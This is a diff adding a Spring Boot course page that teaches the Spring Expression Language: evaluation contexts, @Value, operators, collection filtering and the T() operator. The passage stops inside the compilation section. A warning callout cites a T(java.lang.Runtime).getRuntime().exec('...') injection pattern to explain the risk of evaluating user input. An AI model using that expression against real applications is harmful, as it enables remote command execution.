@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spring Expression Language (SpEL) - Spring Boot Mastery</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="sidebar-overlay"></div>
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <h2>🍃 Spring Boot Mastery</h2>
+            <div class="subtitle">Deep Internals • 72 Topics</div>
+        </div>
+        <ul class="sidebar-nav">
+            <li><a href="index.html"><span class="nav-number">🏠</span> Course Overview</a></li>
+            <li class="module-label">Spring Core & IoC Internals</li>
+            <li><a href="01-ioc-container.html"><span class="nav-number">1</span> IoC Container & BeanFactory</a></li>
+            <li><a href="02-application-context.html"><span class="nav-number">2</span> ApplicationContext Lifecycle</a></li>
+            <li><a href="03-bean-lifecycle.html"><span class="nav-number">3</span> Bean Lifecycle & Callbacks</a></li>
+            <li><a href="04-dependency-injection.html"><span class="nav-number">4</span> Dependency Injection Internals</a></li>
+            <li><a href="05-component-scanning.html"><span class="nav-number">5</span> Component Scanning</a></li>
+            <li><a href="06-bean-scopes.html"><span class="nav-number">6</span> Bean Scopes & Proxy Mechanisms</a></li>
+            <li><a href="07-aop-internals.html"><span class="nav-number">7</span> AOP Internals</a></li>
+            <li><a href="08-spel.html" class="active"><span class="nav-number">8</span> Spring Expression Language</a></li>
+        </ul>
+        <div class="progress-tracker">
+            <div class="progress-label">Progress: 0/72 topics completed</div>
+            <div class="progress-bar"><div class="progress-bar-fill" style="width: 0%"></div></div>
+        </div>
+    </aside>
+
+    <header class="topbar">
+        <button class="menu-toggle" aria-label="Toggle sidebar">☰</button>
+        <div class="breadcrumb">Spring Core & IoC Internals → Spring Expression Language</div>
+        <div class="topic-number">Topic 8 of 72</div>
+    </header>
+
+    <main class="main-content">
+        <div class="content-wrapper">
+
+            <h1>Spring Expression Language (SpEL)</h1>
+            <p class="subtitle-description">A powerful expression language for querying and manipulating objects at runtime — used throughout Spring for dynamic configuration, security rules, and cache keys.</p>
+
+            <div class="tags">
+                <span class="tag tag-intermediate">Intermediate</span>
+                <span class="tag tag-spring">Spring</span>
+                <span class="tag tag-concept">Concept</span>
+            </div>
+
+            <!-- ============================================ -->
+            <!-- ANALOGY BOX -->
+            <!-- ============================================ -->
+            <div class="analogy-box">
+                <div class="analogy-title">🧮 The Calculator Analogy</div>
+                <p>Think of SpEL as a <strong>programmable calculator</strong> embedded inside Spring. Property placeholders (<code>${...}</code>) are like a simple lookup table — you give a key, you get a value. SpEL (<code>#{...}</code>) is a full scientific calculator — it can do math, call functions, navigate object graphs, filter collections, and even invoke static methods. It evaluates expressions <em>at runtime</em> against a context that includes your beans, environment, and system properties.</p>
+            </div>
+
+            <!-- ============================================ -->
+            <!-- SECTION 1: SpEL Architecture -->
+            <!-- ============================================ -->
+            <h2>1. SpEL Architecture</h2>
+
+            <p>SpEL follows a classic parser-interpreter pattern with an optional compilation step for performance-critical paths:</p>
+
+            <pre><code><span class="token-comment">// The SpEL evaluation pipeline</span>
+<span class="token-comment">// String → Parser → Expression → EvaluationContext → Result</span>
+
+<span class="token-comment">// Step 1: Create a parser (thread-safe, reuse it)</span>
+<span class="token-type">ExpressionParser</span> parser = <span class="token-keyword">new</span> <span class="token-type">SpelExpressionParser</span>();
+
+<span class="token-comment">// Step 2: Parse the expression string into an AST</span>
+<span class="token-type">Expression</span> expression = parser.<span class="token-function">parseExpression</span>(<span class="token-string">"name.toUpperCase() + ' has ' + accounts.size() + ' accounts'"</span>);
+
+<span class="token-comment">// Step 3: Create an evaluation context (what the expression can "see")</span>
+<span class="token-type">StandardEvaluationContext</span> context = <span class="token-keyword">new</span> <span class="token-type">StandardEvaluationContext</span>(rootObject);
+context.<span class="token-function">setVariable</span>(<span class="token-string">"threshold"</span>, 1000);
+
+<span class="token-comment">// Step 4: Evaluate against the context</span>
+<span class="token-type">String</span> result = expression.<span class="token-function">getValue</span>(context, <span class="token-type">String</span>.<span class="token-keyword">class</span>);
+
+<span class="token-comment">// Or evaluate with a specific root object directly</span>
+<span class="token-type">Boolean</span> isEligible = parser.<span class="token-function">parseExpression</span>(<span class="token-string">"age >= 18"</span>)
+    .<span class="token-function">getValue</span>(context, user, <span class="token-type">Boolean</span>.<span class="token-keyword">class</span>);</code></pre>
+
+            <h3>Key Components</h3>
+
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th>Component</th>
+                        <th>Role</th>
+                        <th>Thread-Safe?</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code><span class="token-type">SpelExpressionParser</span></code></td>
+                        <td>Parses expression strings into AST nodes</td>
+                        <td>✅ Yes — reuse freely</td>
+                    </tr>
+                    <tr>
+                        <td><code><span class="token-type">Expression</span></code></td>
+                        <td>Compiled AST — can be evaluated repeatedly</td>
+                        <td>✅ Yes</td>
+                    </tr>
+                    <tr>
+                        <td><code><span class="token-type">StandardEvaluationContext</span></code></td>
+                        <td>Full-featured context: bean references, type access, constructors, static methods</td>
+                        <td>❌ Not thread-safe</td>
+                    </tr>
+                    <tr>
+                        <td><code><span class="token-type">SimpleEvaluationContext</span></code></td>
+                        <td>Restricted context: no type references, no constructors, no bean access — <strong>SAFE for user input</strong></td>
+                        <td>❌ Not thread-safe</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <pre><code><span class="token-comment">// StandardEvaluationContext — full power (NEVER use with user input)</span>
+<span class="token-type">StandardEvaluationContext</span> fullCtx = <span class="token-keyword">new</span> <span class="token-type">StandardEvaluationContext</span>();
+fullCtx.<span class="token-function">setBeanResolver</span>(<span class="token-keyword">new</span> <span class="token-type">BeanFactoryResolver</span>(beanFactory));
+fullCtx.<span class="token-function">setRootObject</span>(myBean);
+fullCtx.<span class="token-function">setVariable</span>(<span class="token-string">"env"</span>, environment);
+
+<span class="token-comment">// SimpleEvaluationContext — restricted (SAFE for limited user input)</span>
+<span class="token-type">SimpleEvaluationContext</span> safeCtx = <span class="token-type">SimpleEvaluationContext</span>
+    .<span class="token-function">forReadOnlyDataBinding</span>()  <span class="token-comment">// Only property access, no method calls</span>
+    .<span class="token-function">withRootObject</span>(dataObject)
+    .<span class="token-function">build</span>();</code></pre>
+
+            <!-- ============================================ -->
+            <!-- SECTION 2: Where SpEL is Used in Spring -->
+            <!-- ============================================ -->
+            <h2>2. Where SpEL is Used in Spring</h2>
+
+            <p>SpEL is deeply integrated throughout the Spring ecosystem. Anywhere you see <code>#{...}</code> syntax or a <code>condition</code>/<code>key</code> attribute, SpEL is likely powering it:</p>
+
+            <pre><code><span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// 1. @Value — Inject computed values into beans</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{systemProperties['user.timezone'] ?: 'UTC'}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">String</span> timezone;
+
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@paymentConfig.maxRetries * 2}"</span>)  <span class="token-comment">// Access bean properties</span>
+<span class="token-keyword">private int</span> totalAttempts;
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// 2. @ConditionalOnExpression — Conditional bean registration</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-annotation">@Bean</span>
+<span class="token-annotation">@ConditionalOnExpression</span>(<span class="token-string">"${feature.metrics.enabled:false} and '${spring.profiles.active}'.contains('prod')"</span>)
+<span class="token-keyword">public</span> <span class="token-type">MetricsExporter</span> <span class="token-function">metricsExporter</span>() { ... }
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// 3. Spring Security — @PreAuthorize / @PostAuthorize</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-annotation">@PreAuthorize</span>(<span class="token-string">"hasRole('ADMIN') or #userId == authentication.principal.id"</span>)
+<span class="token-keyword">public</span> <span class="token-type">UserProfile</span> <span class="token-function">getProfile</span>(<span class="token-type">Long</span> userId) { ... }
+
+<span class="token-annotation">@PostAuthorize</span>(<span class="token-string">"returnObject.owner == authentication.name"</span>)
+<span class="token-keyword">public</span> <span class="token-type">Document</span> <span class="token-function">getDocument</span>(<span class="token-type">Long</span> docId) { ... }
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// 4. @Cacheable — Dynamic cache key generation</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-annotation">@Cacheable</span>(value = <span class="token-string">"users"</span>, key = <span class="token-string">"#userId + '_' + #locale.language"</span>)
+<span class="token-keyword">public</span> <span class="token-type">UserDTO</span> <span class="token-function">findUser</span>(<span class="token-type">Long</span> userId, <span class="token-type">Locale</span> locale) { ... }
+
+<span class="token-annotation">@CacheEvict</span>(value = <span class="token-string">"users"</span>, condition = <span class="token-string">"#result != null"</span>)
+<span class="token-keyword">public</span> <span class="token-type">User</span> <span class="token-function">updateUser</span>(<span class="token-type">User</span> user) { ... }
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// 5. @EventListener — Conditional event handling</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-annotation">@EventListener</span>(condition = <span class="token-string">"#event.order.total > 1000"</span>)
+<span class="token-keyword">public void</span> <span class="token-function">handleHighValueOrder</span>(<span class="token-type">OrderPlacedEvent</span> event) { ... }
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// 6. @Scheduled — Dynamic cron/delay via SpEL</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-annotation">@Scheduled</span>(fixedDelayString = <span class="token-string">"#{@schedulerConfig.pollingInterval}"</span>)
+<span class="token-keyword">public void</span> <span class="token-function">pollExternalService</span>() { ... }</code></pre>
+
+            <!-- ============================================ -->
+            <!-- SECTION 3: @Value SpEL vs Property Placeholders -->
+            <!-- ============================================ -->
+            <h2>3. @Value: SpEL vs Property Placeholders</h2>
+
+            <div class="callout callout-warning">
+                <div class="callout-title">⚠️ Critical Distinction</div>
+                <p><code><span class="token-annotation">@Value</span>(<span class="token-string">"${...}"</span>)</code> and <code><span class="token-annotation">@Value</span>(<span class="token-string">"#{...}"</span>)</code> look similar but are <strong>completely different mechanisms</strong> processed at different stages of the bean lifecycle!</p>
+            </div>
+
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th>Aspect</th>
+                        <th><code>${property.key}</code> — Placeholder</th>
+                        <th><code>#{expression}</code> — SpEL</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Processor</strong></td>
+                        <td><code>PropertySourcesPlaceholderConfigurer</code> (BeanFactoryPostProcessor)</td>
+                        <td><code>AutowiredAnnotationBeanPostProcessor</code> → SpEL evaluation</td>
+                    </tr>
+                    <tr>
+                        <td><strong>When Resolved</strong></td>
+                        <td>During BeanDefinition post-processing (BEFORE bean instantiation)</td>
+                        <td>During property injection (AFTER bean instantiation)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Source</strong></td>
+                        <td>application.properties/yml, environment variables, system props</td>
+                        <td>Any bean, method call, operator, or literal in the Spring context</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Capabilities</strong></td>
+                        <td>Simple key-value lookup with default: <code>${key:default}</code></td>
+                        <td>Full expression: math, method calls, conditionals, collections</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Can Call Methods?</strong></td>
+                        <td>❌ No</td>
+                        <td>✅ Yes — <code>#{@bean.method()}</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Can Do Math?</strong></td>
+                        <td>❌ No</td>
+                        <td>✅ Yes — <code>#{2 * 1024 * 1024}</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Can Reference Beans?</strong></td>
+                        <td>❌ No</td>
+                        <td>✅ Yes — <code>#{@beanName}</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Default Value Syntax</strong></td>
+                        <td><code>${key:defaultValue}</code></td>
+                        <td><code>#{expression ?: defaultValue}</code> (Elvis)</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <pre><code><span class="token-comment">// ❌ Common mistake: mixing up the syntax</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"${database.pool.size}"</span>)         <span class="token-comment">// ✅ Placeholder: looks up key in properties</span>
+<span class="token-keyword">private int</span> poolSize;
+
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{${database.pool.size} * 2}"</span>)  <span class="token-comment">// ✅ COMBINED: placeholder resolved first, then SpEL evaluates</span>
+<span class="token-keyword">private int</span> doublePoolSize;
+
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@dataSource.maxPoolSize}"</span>)    <span class="token-comment">// ✅ SpEL: accesses a bean's property</span>
+<span class="token-keyword">private int</span> maxPool;
+
+<span class="token-annotation">@Value</span>(<span class="token-string">"${@dataSource.maxPoolSize}"</span>)    <span class="token-comment">// ❌ WRONG: placeholders can't access beans</span>
+<span class="token-keyword">private int</span> broken;</code></pre>
+
+            <div class="callout callout-info">
+                <div class="callout-title">💡 Resolution Order</div>
+                <p>When you combine both: <code><span class="token-annotation">@Value</span>(<span class="token-string">"#{${pool.size} * 2}"</span>)</code>, the <strong>placeholder is resolved first</strong> (by <code>PropertySourcesPlaceholderConfigurer</code>), producing something like <code>"#{10 * 2}"</code>, then SpEL evaluates the resulting expression to <code>20</code>.</p>
+            </div>
+
+            <!-- ============================================ -->
+            <!-- SECTION 4: Accessing Beans and Properties -->
+            <!-- ============================================ -->
+            <h2>4. Accessing Beans and System Properties</h2>
+
+            <pre><code><span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Accessing Spring beans via @beanName</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-comment">// Reference a bean</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@appConfig}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">AppConfig</span> config;
+
+<span class="token-comment">// Call a bean method</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@appConfig.getMaxRetries()}"</span>)
+<span class="token-keyword">private int</span> maxRetries;
+
+<span class="token-comment">// Access nested bean property (Spring uses property accessors)</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@dataSourceConfig.primary.url}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">String</span> dbUrl;
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Accessing system properties and environment</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-comment">// System properties (java.lang.System.getProperties())</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{systemProperties['user.home']}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">String</span> userHome;
+
+<span class="token-comment">// Environment variables (OS-level)</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{systemEnvironment['PATH']}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">String</span> path;
+
+<span class="token-comment">// Spring Environment abstraction</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{environment.getProperty('spring.datasource.url')}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">String</span> dsUrl;
+
+<span class="token-comment">// Active profiles check</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{environment.acceptsProfiles('prod', 'staging')}"</span>)
+<span class="token-keyword">private boolean</span> isProductionLike;</code></pre>
+
+            <div class="callout callout-info">
+                <div class="callout-title">🔍 How Bean Resolution Works in SpEL</div>
+                <p>The <code>@beanName</code> syntax triggers the <code>BeanResolver</code> interface. Spring registers a <code>BeanFactoryResolver</code> that delegates to <code>BeanFactory.getBean(beanName)</code>. The <code>#systemProperties</code> and <code>#systemEnvironment</code> are registered as variables in the <code>StandardBeanExpressionResolver</code> during context startup.</p>
+            </div>
+
+            <!-- ============================================ -->
+            <!-- SECTION 5: Operators -->
+            <!-- ============================================ -->
+            <h2>5. SpEL Operators</h2>
+
+            <pre><code><span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Safe Navigation Operator (?.) — avoids NullPointerException</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@userService.currentUser?.address?.city}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">String</span> city;  <span class="token-comment">// null if any part is null (no NPE!)</span>
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Elvis Operator (?:) — default value if null</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@userService.currentUser?.name ?: 'Anonymous'}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">String</span> displayName;  <span class="token-comment">// 'Anonymous' if name is null</span>
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// instanceof operator</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-annotation">@PreAuthorize</span>(<span class="token-string">"#request instanceof T(com.app.dto.AdminRequest)"</span>)
+<span class="token-keyword">public void</span> <span class="token-function">adminAction</span>(<span class="token-type">Request</span> request) { ... }
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// matches operator (regex)</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@config.email matches '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}'}"</span>)
+<span class="token-keyword">private boolean</span> isValidEmail;
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Collection/Array access</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@config.servers[0]}"</span>)          <span class="token-comment">// List index access</span>
+<span class="token-keyword">private</span> <span class="token-type">String</span> primaryServer;
+
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@config.settings['timeout']}"</span>)  <span class="token-comment">// Map key access</span>
+<span class="token-keyword">private int</span> timeout;
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Relational and Logical operators</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// eq (==), ne (!=), lt (&lt;), le (&lt;=), gt (&gt;), ge (&gt;=)</span>
+<span class="token-comment">// and (&&), or (||), not (!)</span>
+<span class="token-annotation">@PreAuthorize</span>(<span class="token-string">"#order.total gt 0 and #order.status eq 'PENDING'"</span>)
+<span class="token-keyword">public void</span> <span class="token-function">processOrder</span>(<span class="token-type">Order</span> order) { ... }</code></pre>
+
+            <!-- ============================================ -->
+            <!-- SECTION 6: Collection Selection & Projection -->
+            <!-- ============================================ -->
+            <h2>6. Collection Selection & Projection</h2>
+
+            <p>SpEL provides SQL-like operations on collections — <strong>selection</strong> is filtering (like <code>WHERE</code> / <code>.filter()</code>) and <strong>projection</strong> is mapping (like <code>SELECT column</code> / <code>.map()</code>):</p>
+
+            <pre><code><span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Selection (.?[condition]) — filter elements matching condition</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-comment">// Get all active users (like: users.stream().filter(u -> u.isActive()).collect(...))</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@userRepository.findAll().?[active == true]}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">List</span>&lt;<span class="token-type">User</span>&gt; activeUsers;
+
+<span class="token-comment">// First matching element (.^[condition])</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@userRepository.findAll().^[role == 'ADMIN']}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">User</span> firstAdmin;
+
+<span class="token-comment">// Last matching element (.$[condition])</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@userRepository.findAll().$[role == 'ADMIN']}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">User</span> lastAdmin;
+
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="token-comment">// Projection (.![expression]) — transform each element</span>
+<span class="token-comment">// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="token-comment">// Extract all usernames (like: users.stream().map(u -> u.getName()).collect(...))</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@userRepository.findAll().![name]}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">List</span>&lt;<span class="token-type">String</span>&gt; allUsernames;
+
+<span class="token-comment">// Combined: filter then project (chaining)</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@orderService.getOrders().?[total > 1000].![customerEmail]}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">List</span>&lt;<span class="token-type">String</span>&gt; highValueCustomerEmails;
+
+<span class="token-comment">// Works with Maps too — iterates over Entry objects</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{@config.featureFlags.?[value == true].![key]}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">List</span>&lt;<span class="token-type">String</span>&gt; enabledFeatures;</code></pre>
+
+            <div class="callout callout-info">
+                <div class="callout-title">💡 #this in Collection Operations</div>
+                <p>Inside selection/projection, <code>#this</code> refers to the current element being evaluated. For simple property access you can use the property name directly, but for complex expressions you need <code>#this</code>: <code>.?[#this.length() > 5]</code> on a <code>List&lt;String&gt;</code>.</p>
+            </div>
+
+            <!-- ============================================ -->
+            <!-- SECTION 7: T() Operator -->
+            <!-- ============================================ -->
+            <h2>7. T() Operator — Static Method Access</h2>
+
+            <p>The <code>T()</code> operator gives you a reference to a Java <code>Class</code> object, enabling access to static methods and constants:</p>
+
+            <pre><code><span class="token-comment">// Access static methods</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{T(java.lang.Math).random()}"</span>)
+<span class="token-keyword">private double</span> randomValue;
+
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{T(java.lang.Math).max(${pool.min}, ${pool.max})}"</span>)
+<span class="token-keyword">private int</span> effectivePoolSize;
+
+<span class="token-comment">// Access static constants</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{T(java.lang.Integer).MAX_VALUE}"</span>)
+<span class="token-keyword">private int</span> maxInt;
+
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{T(java.util.concurrent.TimeUnit).SECONDS.toMillis(30)}"</span>)
+<span class="token-keyword">private long</span> timeoutMillis;
+
+<span class="token-comment">// Use with enum values</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{T(com.app.enums.Environment).PRODUCTION}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">Environment</span> prodEnv;
+
+<span class="token-comment">// UUID generation</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{T(java.util.UUID).randomUUID().toString()}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">String</span> instanceId;
+
+<span class="token-comment">// Current timestamp</span>
+<span class="token-annotation">@Value</span>(<span class="token-string">"#{T(java.time.Instant).now()}"</span>)
+<span class="token-keyword">private</span> <span class="token-type">Instant</span> startupTime;</code></pre>
+
+            <div class="callout callout-warning">
+                <div class="callout-title">⚠️ T() and Security</div>
+                <p>The <code>T()</code> operator can access ANY class on the classpath including <code>T(java.lang.Runtime).getRuntime().exec('...')</code>. This is why <code>SimpleEvaluationContext</code> <strong>completely disables</strong> type references. Never allow user input near <code>T()</code>!</p>
+            </div>
+
+            <!-- ============================================ -->
+            <!-- SECTION 8: #root and #this -->
+            <!-- ============================================ -->
+            <h2>8. Context Variables: #root and #this</h2>
+
+            <pre><code><span class="token-comment">// #root — always refers to the root object of the evaluation context</span>
+<span class="token-comment">// #this — refers to the current evaluation object (changes in collections)</span>
+
+<span class="token-type">ExpressionParser</span> parser = <span class="token-keyword">new</span> <span class="token-type">SpelExpressionParser</span>();
+<span class="token-type">StandardEvaluationContext</span> ctx = <span class="token-keyword">new</span> <span class="token-type">StandardEvaluationContext</span>();
+
+<span class="token-type">Company</span> company = <span class="token-keyword">new</span> <span class="token-type">Company</span>(<span class="token-string">"Acme"</span>, employees);
+ctx.<span class="token-function">setRootObject</span>(company);
+
+<span class="token-comment">// #root.name → "Acme" (always the Company object)</span>
+<span class="token-comment">// In a top-level expression, #root and #this are the same</span>
+parser.<span class="token-function">parseExpression</span>(<span class="token-string">"#root.name"</span>).<span class="token-function">getValue</span>(ctx); <span class="token-comment">// "Acme"</span>
+parser.<span class="token-function">parseExpression</span>(<span class="token-string">"#this.name"</span>).<span class="token-function">getValue</span>(ctx); <span class="token-comment">// "Acme"</span>
+
+<span class="token-comment">// Inside collection selection, #this changes to the current element</span>
+<span class="token-comment">// #root still refers to Company</span>
+parser.<span class="token-function">parseExpression</span>(
+    <span class="token-string">"employees.?[#this.salary > #root.averageSalary]"</span>
+).<span class="token-function">getValue</span>(ctx);
+<span class="token-comment">// #this = each Employee being tested</span>
+<span class="token-comment">// #root = still the Company object</span>
+
+<span class="token-comment">// In @Cacheable context:</span>
+<span class="token-comment">// #root.method     → the cached method</span>
+<span class="token-comment">// #root.target     → the target object</span>
+<span class="token-comment">// #root.caches     → the cache names</span>
+<span class="token-comment">// #root.methodName → shortcut for method name</span>
+<span class="token-comment">// #root.args[0]    → first argument</span>
+<span class="token-annotation">@Cacheable</span>(key = <span class="token-string">"#root.methodName + '_' + #userId"</span>)
+<span class="token-keyword">public</span> <span class="token-type">User</span> <span class="token-function">findUser</span>(<span class="token-type">Long</span> userId) { ... }
+
+<span class="token-comment">// In Spring Security @PreAuthorize context:</span>
+<span class="token-comment">// #root → MethodSecurityExpressionRoot (has hasRole(), authentication, etc.)</span>
+<span class="token-comment">// Method parameters are available by name via #paramName</span>
+<span class="token-annotation">@PreAuthorize</span>(<span class="token-string">"#root.hasRole('ADMIN') or #userId == #root.authentication.principal.id"</span>)
+<span class="token-keyword">public</span> <span class="token-type">User</span> <span class="token-function">getUser</span>(<span class="token-type">Long</span> userId) { ... }</code></pre>
+
+            <!-- ============================================ -->
+            <!-- SECTION 9: SpEL Compilation -->
+            <!-- ============================================ -->
+            <h2>9. SpEL Compilation — Performance Optimization</h2>
+
+            <p>By default, SpEL expressions are <strong>interpreted</strong> — the AST is walked on every evaluation. For hot paths (cache keys evaluated millions of times), SpEL can compile expressions to bytecode:</p>
+
+            <pre><code><span class="token-comment">// SpEL Compiler Modes</span>
+<span class="token-keyword">public enum</span> <span class="token-class">SpelCompilerMode</span> {
+    OFF,         <span class="token-comment">// Default — always interpret (safest)</span>
+    IMMEDIATE,   <span class="token-comment">// Compile immediately after first interpretation</span>
+    MIXED        <span class="token-comment">// Interpret first, compile after threshold; fall back on error</span>
+}
+
